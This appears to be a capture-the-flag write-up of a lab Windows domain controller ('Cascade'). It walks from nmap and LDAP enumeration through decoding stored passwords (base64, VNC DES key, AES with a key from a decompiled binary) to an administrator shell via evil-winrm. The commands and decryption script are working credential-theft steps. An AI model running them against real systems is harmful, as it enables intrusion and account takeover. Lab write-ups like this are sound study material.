# Reconnaissance
- 
## Nmap Enumeration
- We pass the commands:
```bash
nmap -sV -sC -vv 10.10.10.182
nmap -sU --top-ports=10 -vv 10.10.10.182

---OUTPUT-TCP---
PORT      STATE SERVICE       REASON          VERSION
53/tcp    open  domain        syn-ack ttl 127 Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
| dns-nsid: 
|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: cascade.local, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds? syn-ack ttl 127
636/tcp   open  tcpwrapped    syn-ack ttl 127
3268/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: cascade.local, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped    syn-ack ttl 127
5985/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49154/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49155/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49157/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
49158/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49165/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
Service Info: Host: CASC-DC1; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows

Host script results:
|_clock-skew: -1s
| smb2-security-mode: 
|   2:1:0: 
|_    Message signing enabled and required
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 51409/tcp): CLEAN (Timeout)
|   Check 2 (port 14611/tcp): CLEAN (Timeout)
|   Check 3 (port 10882/udp): CLEAN (Timeout)
|   Check 4 (port 37551/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-time: 
|   date: 2025-04-23T11:45:15
|_  start_date: 2025-04-23T11:42:46

---OUTPUT-UDP---
PORT     STATE         SERVICE      REASON
53/udp   open          domain       udp-response ttl 127
123/udp  open          ntp          udp-response ttl 127
```
----
## SMB Enumeration
- Initial enumeration gives nothing with null, guest and anonymous
## RPC Enumeration
- Initial enumeration gives nothing with null, guest and anonymous
## LDAPsearch
- checked anonymous authentication with ldap:
```bash
ldapsearch -x -H ldap://10.10.10.182 -s base namingcontexts 
```
- Checking for bad passwords:
```bash
ldapsearch -x -H ldap://10.10.10.182 -b "DC=cascade,DC=local" | grep -i "pwd"
ldapsearch -x -H ldap://10.10.10.182 -b "DC=cascade,DC=local" | grep -i "pwd" -A10 -B10

---RELEVANT-OUTPUT-1---
cascadeLegacyPwd: clk0bjVldmE=

---RELEVANT-OUTPUT-2---
sAMAccountType: 805306368
userPrincipalName: r.thompson@cascade.local
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=cascade,DC=local
dSCorePropagationData: 20200126183918.0Z
dSCorePropagationData: 20200119174753.0Z
dSCorePropagationData: 20200119174719.0Z
dSCorePropagationData: 20200119174508.0Z
dSCorePropagationData: 16010101000000.0Z
lastLogonTimestamp: 132294360317419816
msDS-SupportedEncryptionTypes: 0
cascadeLegacyPwd: clk0bjVldmE=

# {4026EDF8-DBDA-4AED-8266-5A04B80D9327}, Policies, System, cascade.local
dn: CN={4026EDF8-DBDA-4AED-8266-5A04B80D9327},CN=Policies,CN=System,DC=cascade
 ,DC=local

# {D67C2AD5-44C7-4468-BA4C-199E75B2F295}, Policies, System, cascade.local
dn: CN={D67C2AD5-44C7-4468-BA4C-199E75B2F295},CN=Policies,CN=System,DC=cascade
 ,DC=local

# Util, Services, Users, UK, cascade.local

```
- We get credentials of r.thompson user  `clk0bjVldmE=`
- We try check with crackmap exec but it fails
- Maybe it is encoded
- It looks like base64 so we try to decode it :
```bash
echo clk0bjVldmE= | base64 -d

---OUTPUT---
rY4n5eva
```
- We check smb with these credentials and find some shares we can access:
```bash
crackmapexec smb 10.10.10.182 -u 'r.thompson' -p 'rY4n5eva' --shares

---OUTPUT---
SMB         10.10.10.182    445    CASC-DC1         [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:CASC-DC1) (domain:cascade.local) (signing:True) (SMBv1:False)
SMB         10.10.10.182    445    CASC-DC1         [+] cascade.local\r.thompson:rY4n5eva 
SMB         10.10.10.182    445    CASC-DC1         [+] Enumerated shares
SMB         10.10.10.182    445    CASC-DC1         Share           Permissions     Remark
SMB         10.10.10.182    445    CASC-DC1         -----           -----------     ------
SMB         10.10.10.182    445    CASC-DC1         ADMIN$                          Remote Admin
SMB         10.10.10.182    445    CASC-DC1         Audit$                          
SMB         10.10.10.182    445    CASC-DC1         C$                              Default share
SMB         10.10.10.182    445    CASC-DC1         Data            READ            
SMB         10.10.10.182    445    CASC-DC1         IPC$                            Remote IPC
SMB         10.10.10.182    445    CASC-DC1         NETLOGON        READ            Logon server share 
SMB         10.10.10.182    445    CASC-DC1         print$          READ            Printer Drivers
SMB         10.10.10.182    445    CASC-DC1         SYSVOL          READ            Logon server share
```
- We access print$ share and find nothing relevant
- We access Data share and we can access one folder in it which holds some files:
```bash
smbclient -U 'r.thompson' //10.10.10.182/Data --password='rY4n5eva'
smb: \> cd IT\
smb: \> dir

---OUTPUT---
  .                                   D        0  Tue Jan 28 13:04:51 2020
  ..                                  D        0  Tue Jan 28 13:04:51 2020
  Email Archives                      D        0  Tue Jan 28 13:00:30 2020
  LogonAudit                          D        0  Tue Jan 28 13:04:40 2020
  Logs                                D        0  Tue Jan 28 19:53:04 2020
  Temp                                D        0  Tue Jan 28 17:06:59 2020

                6553343 blocks of size 4096. 1625203 blocks available
```
- I explore the folder and get some files I feel would be relevant:
```bash
smb: \IT\> cd Logs\DC$\
smb: \IT\Logs\DC$\> get dcdiag.log
smb: \IT\Logs\DC$> cd ..
smb: \IT\Logs\> cd "Ark AD Recycle Bin"
smb: \IT\Logs\Ark AD Recycle Bin\> get ArkAdRecycleBin.log
smb: \IT\Logs\Ark AD Recycle Bin\> cd ..
smb: \IT\Logs\> cd ..
smb: \IT\> cd "Email Archives"
smb: \IT\Email Archives\> get Meeting_Notes_June_2018.html
smb: \IT\Email Archives\> cd ..
smb: \IT\> cd Temp\
smb: \IT\Temp\> cd s.smith\
smb: \IT\Temp\s.smith\> get "VNC Install.reg"
```
- On reading the files
- Meeting Notes we see a user TempAdmin exists with the same password as administrator
- On reading VNC Install.reg file we find some sort of hex password:
```bash
cat VNC\ Install.reg

---RELEVANT-OUTPUT---
"Password"=hex:6b,cf,2a,4b,6e,5a,ca,0f
```
- We try to decrypt this like last time (but for hex) but don't get a readable output:
```bash
echo 6bcf2a4b6e5aca0f | xxd -r -p

---OUTPUT---
k�*KnZ�
```
- On searching online for "vnc registry file password decrypt" I came across a link:
- https://github.com/frizb/PasswordDecrypts
- There is a way via meterpreter :
```bash
msf6 > irb
[*] Starting IRB shell...
[*] You are in the "framework" object

irb: warn: can't alias jobs from irb_jobs.
>> fixedkey = "\x17\x52\x6b\x06\x23\x4e\x58\x07"
=> "\x17Rk\x06#NX\a"
>> require 'rex/proto/rfb'
=> true
>> Rex::Proto::RFB::Cipher.decrypt ["6bcf2a4b6e5aca0f"].pack('H*'), fixedkey
=> "sT333ve2"
>> 
```
- has more references to vnc password crack but also provides the command which I use with my data:
```bash
echo -n 6bcf2a4b6e5aca0f | xxd -r -p | openssl enc -des-cbc --nopad --nosalt -K e84ad660c4721ae0 -iv 0000000000000000 -d -provider legacy -provider default | hexdump -Cv

---OUTPUT---
00000000  73 54 33 33 33 76 65 32                           |sT333ve2|
00000008
```
- We check these credentials with smb and winrm:
```bash
crackmapexec smb 10.10.10.182 -u 's.smith' -p 'sT333ve2'
crackmapexec winrm 10.10.10.182 -u 's.smith' -p 'sT333ve2'

---OUTPUT-SMB---
SMB         10.10.10.182    445    CASC-DC1         [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:CASC-DC1) (domain:cascade.local) (signing:True) (SMBv1:False)
SMB         10.10.10.182    445    CASC-DC1         [+] cascade.local\s.smith:sT333ve2

---OUTPUT-WINRM---
SMB         10.10.10.182    5985   CASC-DC1         [*] Windows 7 / Server 2008 R2 Build 7601 (name:CASC-DC1) (domain:cascade.local)
HTTP        10.10.10.182    5985   CASC-DC1         [*] http://10.10.10.182:5985/wsman
/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from this module in 48.0.0.
  arc4 = algorithms.ARC4(self._key)
WINRM       10.10.10.182    5985   CASC-DC1         [+] cascade.local\s.smith:sT333ve2 (Pwn3d!)

```
- We get a hit for both
- We login via winrm 
```bash
evil-winrm -u 's.smith' -p 'sT333ve2' -i 10.10.10.182

---OUTPUT---
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine                                                                       
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion                                                                                         
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\s.smith\Documents> whoami
cascade\s.smith
```

----------
## Lateral Movement in Target
- We do some initial enumeration:
- whoami /all
```bash
whoami /all # whoami /priv for privileges only

---OUTPUT-WHOAMI-ALL---
USER INFORMATION
----------------

User Name       SID
=============== ==============================================
cascade\s.smith S-1-5-21-3332504370-1206983947-1165150453-1107


GROUP INFORMATION
-----------------

Group Name                                  Type             SID                                            Attributes
=========================================== ================ ============================================== ===============================================================
Everyone                                    Well-known group S-1-1-0                                        Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                               Alias            S-1-5-32-545                                   Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554                                   Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                        Well-known group S-1-5-2                                        Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users            Well-known group S-1-5-11                                       Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization              Well-known group S-1-5-15                                       Mandatory group, Enabled by default, Enabled group
CASCADE\Data Share                          Alias            S-1-5-21-3332504370-1206983947-1165150453-1138 Mandatory group, Enabled by default, Enabled group, Local Group
CASCADE\Audit Share                         Alias            S-1-5-21-3332504370-1206983947-1165150453-1137 Mandatory group, Enabled by default, Enabled group, Local Group
CASCADE\IT                                  Alias            S-1-5-21-3332504370-1206983947-1165150453-1113 Mandatory group, Enabled by default, Enabled group, Local Group
CASCADE\Remote Management Users             Alias            S-1-5-21-3332504370-1206983947-1165150453-1126 Mandatory group, Enabled by default, Enabled group, Local Group
NT AUTHORITY\NTLM Authentication            Well-known group S-1-5-64-10                                    Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Plus Mandatory Level Label            S-1-16-8448


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
```
- net users :
```bash
net users
net user s.smith
net user r.thompson

---OUTPUT-USERS---
User accounts for \\

-------------------------------------------------------------------------------
a.turnbull               administrator            arksvc
b.hanson                 BackupSvc                CascGuest
d.burman                 e.crowe                  i.croft
j.allen                  j.goodhand               j.wakefield
krbtgt                   r.thompson               s.hickson
s.smith                  util
The command completed with one or more errors.

---OUTPUT-SMITH---
User name                    s.smith
Full Name                    Steve Smith
Comment
User's comment
Country code                 000 (System Default)
Account active               Yes
Account expires              Never

Password last set            1/28/2020 8:58:05 PM
Password expires             Never
Password changeable          1/28/2020 8:58:05 PM
Password required            Yes
User may change password     No

Workstations allowed         All
Logon script                 MapAuditDrive.vbs
User profile
Home directory
Last logon                   4/23/2025 3:14:41 PM

Logon hours allowed          All

Local Group Memberships      *Audit Share          *IT
                             *Remote Management Use
Global Group memberships     *Domain Users
The command completed successfully.

```
- We see s.smith is in a group Audit Share. There was an SMB share which thompson couldn't access a share called Audit. Also if we check thompson's group memberships, he is not part of this Audit Share group.
- We check if s.smith can access Audit share folder
```bash
crackmapexec smb 10.10.10.182 -u 's.smith' -p 'sT333ve2' --shares     
SMB         10.10.10.182    445    CASC-DC1         [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:CASC-DC1) (domain:cascade.local) (signing:True) (SMBv1:False)
SMB         10.10.10.182    445    CASC-DC1         [+] cascade.local\s.smith:sT333ve2 
SMB         10.10.10.182    445    CASC-DC1         [+] Enumerated shares
SMB         10.10.10.182    445    CASC-DC1         Share           Permissions     Remark
SMB         10.10.10.182    445    CASC-DC1         -----           -----------     ------
SMB         10.10.10.182    445    CASC-DC1         ADMIN$                          Remote Admin
SMB         10.10.10.182    445    CASC-DC1         Audit$          READ            
SMB         10.10.10.182    445    CASC-DC1         C$                              Default share
SMB         10.10.10.182    445    CASC-DC1         Data            READ            
SMB         10.10.10.182    445    CASC-DC1         IPC$                            Remote IPC
SMB         10.10.10.182    445    CASC-DC1         NETLOGON        READ            Logon server share 
SMB         10.10.10.182    445    CASC-DC1         print$          READ            Printer Drivers
SMB         10.10.10.182    445    CASC-DC1         SYSVOL          READ            Logon server share
```
- He has read privileges
- We access the share and grab all files:
```bash
smbclient -U 's.smith' //10.10.10.182/Audit$ --password='sT333ve2'
smb: \> prompt OFF
smb: \> recurse ON
smb: \> mget *

---OUTPUT-MAIN-DIR---
  .                                   D        0  Wed Jan 29 13:01:26 2020
  ..                                  D        0  Wed Jan 29 13:01:26 2020
  CascAudit.exe                      An    13312  Tue Jan 28 16:46:51 2020
  CascCrypto.dll                     An    12288  Wed Jan 29 13:00:20 2020
  DB                                  D        0  Tue Jan 28 16:40:59 2020
  RunAudit.bat                        A       45  Tue Jan 28 18:29:47 2020
  System.Data.SQLite.dll              A   363520  Sun Oct 27 02:38:36 2019
  System.Data.SQLite.EF6.dll          A   186880  Sun Oct 27 02:38:38 2019
  x64                                 D        0  Sun Jan 26 17:25:27 2020
  x86                                 D        0  Sun Jan 26 17:25:27 2020

                6553343 blocks of size 4096. 1617919 blocks available

```
- We read Audit.db with sqlite3 command:
```bash
sqlite3 Audit.db .dump

---RELEVANT-OUTPUT---
PRAGMA foreign_keys=OFF;
BEGIN TRANSACTION;
CREATE TABLE IF NOT EXISTS "Ldap" (
        "Id"    INTEGER PRIMARY KEY AUTOINCREMENT,
        "uname" TEXT,
        "pwd"   TEXT,
        "domain"        TEXT
);
INSERT INTO Ldap VALUES(1,'ArkSvc','BQO5l5Kj9MdErXx6Q6AGOw==','cascade.local');
CREATE TABLE IF NOT EXISTS "Misc" (
        "Id"    INTEGER PRIMARY KEY AUTOINCREMENT,
        "Ext1"  TEXT,
        "Ext2"  TEXT
);
CREATE TABLE IF NOT EXISTS "DeletedUserAudit" (
        "Id"    INTEGER PRIMARY KEY AUTOINCREMENT,
        "Username"      TEXT,
        "Name"  TEXT,
        "DistinguishedName"     TEXT
);
INSERT INTO DeletedUserAudit VALUES(6,'test',replace('Test\nDEL:ab073fb7-6d91-4fd1-b877-817b9e1b0e6d','\n',char(10)),'CN=Test\0ADEL:ab073fb7-6d91-4fd1-b877-817b9e1b0e6d,CN=Deleted Objects,DC=cascade,DC=local');
INSERT INTO DeletedUserAudit VALUES(7,'deleted',replace('deleted guy\nDEL:8cfe6d14-caba-4ec0-9d3e-28468d12deef','\n',char(10)),'CN=deleted guy\0ADEL:8cfe6d14-caba-4ec0-9d3e-28468d12deef,CN=Deleted Objects,DC=cascade,DC=local');
INSERT INTO DeletedUserAudit VALUES(9,'TempAdmin',replace('TempAdmin\nDEL:5ea231a1-5bb4-4917-b07a-75a57f4c188a','\n',char(10)),'CN=TempAdmin\0ADEL:5ea231a1-5bb4-4917-b07a-75a57f4c188a,CN=Deleted Objects,DC=cascade,DC=local');
DELETE FROM sqlite_sequence;
INSERT INTO sqlite_sequence VALUES('Ldap',2);
INSERT INTO sqlite_sequence VALUES('DeletedUserAudit',10);
COMMIT;
```
- We see some ArkSvc credentials : `ArkSvc`:`BQO5l5Kj9MdErXx6Q6AGOw==`
- We use it but fails. We try to decrypt base64 on it but it doesn't give anything readable
```bash
echo "BQO5l5Kj9MdErXx6Q6AGOw==" | base64 -d

## Failed/ No hits
crackmapexec smb 10.10.10.182 -u 'ArkSvc' -p 'BQO5l5Kj9MdErXx6Q6AGOw=='
crackmapexec winrm 10.10.10.182 -u 'ArkSvc' -p 'BQO5l5Kj9MdErXx6Q6AGOw=='


---OUTPUT-ECHO---
������D�|zC�;
```
- I then decide to analyze the CascAudit.exe file with dnSpy ( I move all thse files to my Windows host for this)
- I check the main module and I see a command :
```bash
password = Crypto.DecryptString(encryptedString, "c4scadek3y654321");
```
- If we check Crypto.DecryptString function it will eplain how it decrypts (basically takes a key and encrypted string as arguments to decrypt)
- Uses AES encryption with a key. Using this and the base64 encoded password, we can write a code to decrypt it:
```python
from base64 import b64decode
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad

def decrypt_string(encrypted_b64: str, key: str) -> str:
    iv = b"1tdyjCbY1Ix49842"  # 16-byte IV from the original C# code
    key_bytes = key.encode('utf-8')  # 16-byte key for AES-128
    encrypted_bytes = b64decode(encrypted_b64)

    cipher = AES.new(key_bytes, AES.MODE_CBC, iv)
    decrypted = cipher.decrypt(encrypted_bytes)

    try:
        plaintext = unpad(decrypted, AES.block_size)
    except ValueError:
        raise Exception("Invalid padding. Possibly wrong key or corrupted data.")
    
    return plaintext.decode('utf-8')

# Your encrypted data and key
encrypted = "BQO5l5Kj9MdErXx6Q6AGOw=="
key = "c4scadek3y654321"

# Decrypt and print the result
try:
    decrypted = decrypt_string(encrypted, key)
    print("Decrypted text:", decrypted)
except Exception as e:
    print("Error:", e)
```
- Execute the file:
```bash
python3 -m venv venv
source venv/bin/activate
pip install pycryptodome
python pythoncrack.py

---OUTPUT---
Decrypted text: w3lc0meFr31nd
```
- **Alternate Method (Easier)**
- Going back to analysing the executable with dnSpy, we can add a break at the line of code decrypting the password (shown above) and run the code and hopefully grab the password from it:
- We press F9 to add a break point at that command and run the file. Continue till it reaches our break point. We can then step over (with F10) and we should be able to see the password in plain text:
- ![[Pasted image 20250423121049.png]]
```bash
w3lc0meFr31nd\0\0\0
```
- We login to this user's account.
```bash

```
- On enumeration we find user is in AD Recycle Bin group:
```bash
net user arksvc

---OUTPUT---
User name                    arksvc
Full Name                    ArkSvc
Comment
User's comment
Country code                 000 (System Default)
Account active               Yes
Account expires              Never

Password last set            1/9/2020 5:18:20 PM
Password expires             Never
Password changeable          1/9/2020 5:18:20 PM
Password required            Yes
User may change password     No

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   1/29/2020 10:05:40 PM

Logon hours allowed          All

Local Group Memberships      *AD Recycle Bin       *IT
                             *Remote Management Use
Global Group memberships     *Domain Users
The command completed successfully.
```
- Looking through google I came across this link:
- https://github.com/MicrosoftDocs/windowsserverdocs/blob/main/WindowsServerDocs/identity/ad-ds/get-started/adac/active-directory-recycle-bin.md
- I tried to restore a user (although I shouldn't have as that wouldn't do much) but got a permission error:
```bash
Get-ADObject -Filter 'Name -Like "*User*"' -IncludeDeletedObjects
Get-ADObject -Filter 'Name -Like "*TempAdmin*"' -IncludeDeletedObjects
Get-ADObject -Filter 'Name -Like "*TempAdmin*"' -IncludeDeletedObjects | Restore-ADObject

---OUTPUT---
Insufficient access rights to perform the operation
At line:1 char:74
+ ...  'Name -Like "*TempAdmin*"' -IncludeDeletedObjects | Restore-ADObject
+                                                          ~~~~~~~~~~~~~~~~
    + CategoryInfo          : InvalidOperation: (CN=TempAdmin\0A...ascade,DC=local:ADObject) [Restore-ADObject], ADException
    + FullyQualifiedErrorId : 0,Microsoft.ActiveDirectory.Management.Commands.RestoreADObject
```
- Then I tried to enable AD Recycle Bin but the machine hung (again, unnecessary)
```bash
Enable-ADOptionalFeature -Identity 'CN=Recycle Bin Feature,CN=Optional Features,CN=Directory Service,CN=Windows NT,CN=Services,CN=Configuration,DC=cascade,DC=local' -Scope ForestOrConfigurationSet -Target 'cascade.local'

---OUTPUT---
Warning: Enabling 'Recycle Bin Feature' on 'CN=Partitions,CN=Configuration,DC=cascade,DC=local' is an irreversible action! You will not be able to disable 'Recycle Bin Feature' on 'CN=Partitions,CN=Configuration,DC=cascade,DC=local' if you proceed.

y
^C                                        
Error: An error of type WinRM::WinRMAuthorizationError happened, message is WinRM::WinRMAuthorizationError                                                                                                    
                                        
Error: Exiting with code 1
```
- Then looking back at my second command, I tried to simply get more information on the TempAdmin user 
```bash
Get-ADObject -Filter 'Name -Like "*TempAdmin*"' -IncludeDeleted -Properties *
--OR--
Get-ADObject -Filter 'Name -Like "*TempAdmin*"' -IncludeDeleted -Properties * | findstr /i  pwd

---RELEVANT-OUTPUT---
cascadeLegacyPwd                : YmFDVDNyMWFOMDBkbGVz
```
- Alternatvely on searching google for "query deleted objects get addomain" I found this link
- https://forums.powershell.org/t/find-all-deleted-ad-objects-in-the-past-30-days/3731
```bash
Get-ADObject -SearchBase 'CN=Deleted Objects, DC=cascade, DC=local' -Filter {ObjectClass -eq 'user'} -IncludeDeletedObjects -Properties * | ft CN,LastKnownParent,whenChanged -AutoSize
```
- Simply remove the filter and we get all properties where we can find the Password (alternatively we can search for str and if we search for pwd without it being case sensitive we will find it):
```bash
Get-ADObject -SearchBase 'CN=Deleted Objects, DC=cascade, DC=local' -Filter {ObjectClass -eq 'user'} -IncludeDeletedObjects -Properties *
--OR--
Get-ADObject -SearchBase 'CN=Deleted Objects, DC=cascade, DC=local' -Filter {ObjectClass -eq 'user'} -IncludeDeletedObjects -Properties * | findstr /i pwd

---RELEVANT-OUTPUT---
accountExpires                  : 9223372036854775807
badPasswordTime                 : 0
badPwdCount                     : 0
CanonicalName                   : cascade.local/Deleted Objects/TempAdmin
                                  DEL:f0cc344d-31e0-4866-bceb-a842791ca059
cascadeLegacyPwd                : YmFDVDNyMWFOMDBkbGVz
CN                              : TempAdmin
```

- We attempt to check id credentials work with admin:
```bash
crackmapexec winrm 10.10.10.182 -u 'administrator' -p 'YmFDVDNyMWFOMDBkbGVz'
# Also tried (not hit)
# crackmapexec smb 10.10.10.182 -u 'administrator' -p 'YmFDVDNyMWFOMDBkbGVz'

---OUTPUT---
SMB         10.10.10.182    5985   CASC-DC1         [*] Windows 7 / Server 2008 R2 Build 7601 (name:CASC-DC1) (domain:cascade.local)
HTTP        10.10.10.182    5985   CASC-DC1         [*] http://10.10.10.182:5985/wsman
/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from this module in 48.0.0.
  arc4 = algorithms.ARC4(self._key)
WINRM       10.10.10.182    5985   CASC-DC1         [-] cascade.local\administrator:YmFDVDNyMWFOMDBkbGVz
```
- It fails..maybe it is encrypted again
- We try to decrypt with base64:
```bash
echo YmFDVDNyMWFOMDBkbGVz | base64 -d

---OUTPUT---
baCT3r1aN00dles
```
- we get some readable credentials
- We try it with these credentials.
```bash
crackmapexec winrm 10.10.10.182 -u 'administrator' -p 'baCT3r1aN00dles'

---OUTPUT---
SMB         10.10.10.182    5985   CASC-DC1         [*] Windows 7 / Server 2008 R2 Build 7601 (name:CASC-DC1) (domain:cascade.local)
HTTP        10.10.10.182    5985   CASC-DC1         [*] http://10.10.10.182:5985/wsman
/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from this module in 48.0.0.
  arc4 = algorithms.ARC4(self._key)
WINRM       10.10.10.182    5985   CASC-DC1         [+] cascade.local\administrator:baCT3r1aN00dles (Pwn3d!)
```
- We get a hit!
- We login to target as administrator:
```bash
evil-winrm -u 'administrator' -p 'baCT3r1aN00dles' -i 10.10.10.182

---OUTPUT---
Evil-WinRM shell v3.7
 
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine                                                                       

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion                                                                                         
  
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami

```
- We grab the root flag
-----------
--------
## Extras
- Meterpreter route to grab password for s.smith
```bash
msf6 > irb
[*] Starting IRB shell...
[*] You are in the "framework" object

irb: warn: can't alias jobs from irb_jobs.
>> fixedkey = "\x17\x52\x6b\x06\x23\x4e\x58\x07"
=> "\x17Rk\x06#NX\a"
>> require 'rex/proto/rfb'
=> true
>> Rex::Proto::RFB::Cipher.decrypt ["6bcf2a4b6e5aca0f"].pack('H*'), fixedkey
=> "sT333ve2"
>> 
```
-----
- Initially didn't find pwd in ldap (had to use grep -i and search for pwd instead of password)
- Finding all users, fixing it to save to a file:
```bash
ldapsearch -x -H ldap://10.10.10.182 -b "DC=cascade,DC=local" '(ObjectClass=user)' sAMAccountName | grep "sAMAccountName" > ldapusers
cat ldapusers | awk -F: '{print $2}' | awk '{print$1}' > fixedldapusers
```
- We can also use `'(ObjectClass=Person)'` 
- For the second command I use awk twice to remove the space
- Checking password policy incase we brute force:
```bash
crackmapexec smb 10.10.10.182 --pass-pol   

---OUTPUT---
SMB         10.10.10.182    445    CASC-DC1         [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:CASC-DC1) (domain:cascade.local) (signing:True) (SMBv1:False)
SMB         10.10.10.182    445    CASC-DC1         [+] Dumping password info for domain: CASCADE
SMB         10.10.10.182    445    CASC-DC1         Minimum password length: 5
SMB         10.10.10.182    445    CASC-DC1         Password history length: None
SMB         10.10.10.182    445    CASC-DC1         Maximum password age: Not Set
SMB         10.10.10.182    445    CASC-DC1         
SMB         10.10.10.182    445    CASC-DC1         Password Complexity Flags: 000000
SMB         10.10.10.182    445    CASC-DC1             Domain Refuse Password Change: 0
SMB         10.10.10.182    445    CASC-DC1             Domain Password Store Cleartext: 0
SMB         10.10.10.182    445    CASC-DC1             Domain Password Lockout Admins: 0
SMB         10.10.10.182    445    CASC-DC1             Domain Password No Clear Change: 0
SMB         10.10.10.182    445    CASC-DC1             Domain Password No Anon Change: 0
SMB         10.10.10.182    445    CASC-DC1             Domain Password Complex: 0
SMB         10.10.10.182    445    CASC-DC1         
SMB         10.10.10.182    445    CASC-DC1         Minimum password age: None
SMB         10.10.10.182    445    CASC-DC1         Reset Account Lockout Counter: 30 minutes 
SMB         10.10.10.182    445    CASC-DC1         Locked Account Duration: 30 minutes 
SMB         10.10.10.182    445    CASC-DC1         Account Lockout Threshold: None
SMB         10.10.10.182    445    CASC-DC1         Forced Log off Time: Not Set
```
- No lockout threshold
- Tried to check is any user has their own username as password in smb (as well as no password) but that didn't give a hit.
----
- 








```

- winpeas data:
```bash
ÉÍÍÍÍÍÍÍÍÍÍ¹ Looking for AutoLogon credentials
    Some AutoLogon credentials were found
    DefaultDomainName             :  CASCADE
    DefaultUserName               :  vbscrub

```
